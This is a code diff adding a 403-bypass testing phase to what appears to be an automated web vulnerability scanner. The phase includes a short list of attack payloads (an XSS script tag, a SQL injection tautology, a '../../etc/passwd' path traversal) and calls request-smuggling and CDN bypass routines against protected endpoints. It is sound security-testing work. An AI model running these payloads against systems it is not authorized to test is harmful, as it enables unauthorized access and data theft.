+        this.log(jobId, 'info', 'Phase 4j-2: Testing advanced 403 bypass techniques');
+        const testPayloads = [
+          { name: 'XSS', value: '<script>alert(1)</script>' },
+          { name: 'SQLi', value: "' OR 1=1--" },
+          { name: 'Admin access', value: 'admin' },
+          { name: 'Path traversal', value: '../../etc/passwd' },
+        ];
+
+        for (const protectedEp of protectedEndpoints.slice(0, 5)) {
+          if (bypass403Count >= 10) break;
+
+          for (const testPayload of testPayloads) {
+            if (bypass403Count >= 10) break;
+
+            try {
+              const bypassResults = await Advanced403Bypass.testBypass({
+                endpoint: protectedEp.url,
+                originalPayload: testPayload.value,
+                cleanStatus: protectedEp.cleanStatus,
+                timeout: 5000,
+                headers: {
+                  'Content-Type': 'application/json',
+                  'User-Agent': DEFAULT_HTTP_IDENTITY['User-Agent'],
+                },
+              });
+
+              for (const result of bypassResults) {
+                if (result.success && result.confidence > 0.6) {
+                  this.log(jobId, 'vuln', `403 BYPASS [${result.technique}]: ${protectedEp.url}`, {
+                    category: result.category,
+                    confidence: result.confidence,
+                    notes: result.notes,
+                  });
+                  MemoryManager.addFinding(jobId, hostname, {
+                    type: '403 Bypass',
+                    subtype: result.technique,
+                    endpoint: protectedEp.url,
+                    gap: `403 bypass via ${result.technique} (${result.category})`,
+                    chain_potential: 'Access control bypass → unauthorized access to protected resources',
+                    severity: 'HIGH',
+                    technique: result.technique,
+                    category: result.category,
+                    confidence: result.confidence,
+                    notes: result.notes,
+                  });
+                  bypass403Count++;
+                }
+              }
+            } catch {}
+          }
+        }
+        this.log(jobId, 'info', `Phase 4j-2 complete: ${bypass403Count} 403 bypass(es) found`);
+
+        // 4j-3: Protocol-specific 403 bypass testing
+        this.log(jobId, 'info', 'Phase 4j-3: Protocol-specific 403 bypass testing');
+        for (const protectedEp of protectedEndpoints.slice(0, 3)) {
+          if (bypass403Count >= 10) break;
+
+          try {
+            // Test CL.TE smuggling specifically for 403 bypass
+            const smugglingPayload = { test: 'admin', access: 'granted' };
+            const clteResult = await Advanced403Bypass.testBypass({
+              endpoint: protectedEp.url,
+              originalPayload: JSON.stringify(smugglingPayload),
+              cleanStatus: protectedEp.cleanStatus,
+              timeout: 8000,
+            });
+
+            const smugglingSuccess = clteResult.find(r => r.category === 'smuggling' && r.success);
+            if (smugglingSuccess) {
+              this.log(jobId, 'vuln', `SMUGGLING 403 BYPASS: ${protectedEp.url}`, {
+                technique: smugglingSuccess.technique,
+                confidence: smugglingSuccess.confidence,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: '403 Bypass',
+                subtype: smugglingSuccess.technique,
+                endpoint: protectedEp.url,
+                gap: `403 bypass via request smuggling: ${smugglingSuccess.technique}`,
+                chain_potential: 'Access control bypass via parser differential',
+                severity: 'CRITICAL',
+                technique: smugglingSuccess.technique,
+                category: 'smuggling',
+                confidence: smugglingSuccess.confidence,
+              });
+              bypass403Count++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4j-3 complete: protocol-specific bypasses tested`);
+
+        // 4j-4: CDN-specific 403 bypass testing
+        this.log(jobId, 'info', 'Phase 4j-4: CDN-specific 403 bypass testing');
+        for (const protectedEp of protectedEndpoints.slice(0, 3)) {
+          if (bypass403Count >= 10) break;
+
+          try {
+            const cdnPayload = { action: 'admin', resource: 'protected' };
+            const cdnResults = await Advanced403Bypass.testBypass({
+              endpoint: protectedEp.url,
+              originalPayload: JSON.stringify(cdnPayload),
+              cleanStatus: protectedEp.cleanStatus,
+              timeout: 5000,
+            });
+
+            const cdnSuccess = cdnResults.filter(r => r.category === 'cdn' && r.success);
+            for (const cdn of cdnSuccess) {
+              this.log(jobId, 'vuln', `CDN 403 BYPASS [${cdn.technique}]: ${protectedEp.url}`, {
+                confidence: cdn.confidence,
+                notes: cdn.notes,
+              });
+              MemoryManager.addFinding(jobId, hostname, {
+                type: '403 Bypass',
+                subtype: cdn.technique,
+                endpoint: protectedEp.url,
+                gap: `CDN 403 bypass via ${cdn.technique}`,
+                chain_potential: 'CDN configuration bypass → direct origin access',
+                severity: 'HIGH',
+                technique: cdn.technique,
+                category: 'cdn',
+                confidence: cdn.confidence,
+                notes: cdn.notes,
+              });
+              bypass403Count++;
+            }
+          } catch {}
+        }
+        this.log(jobId, 'info', `Phase 4j-4 complete: CDN-specific bypasses tested`);
+
+        // Collect Phase 4j findings
+        const phase4jMemory = MemoryManager.getMemory(jobId, hostname);
+        const phase4jFindings = phase4jMemory.findings.filter((f: Record<string, unknown>) => f.type === '403 Bypass');
+        if (phase4jFindings.length > 0) {
+          allFindings.push({ phase: 'Phase 4j', type: 'Advanced 403 Bypass Results', data: phase4jFindings });
+          vulnerabilities.push(...phase4jFindings.map((f: Record<string, unknown>) => ({
+            type: f.type, endpoint: f.endpoint, gap: f.gap,
+            severity: f.severity || 'HIGH', phase: 'Phase 4j'
+          })));
+        }
+        this.log(jobId, 'info', `Phase 4j complete: ${bypass403Count} 403 bypass(es) added to report`);
 
         // --- PHASE 5: REPORTING (FINAL SYNTHESIS) ---
         this.updateJob(jobId, 'running', 'Phase 5: Reporting');
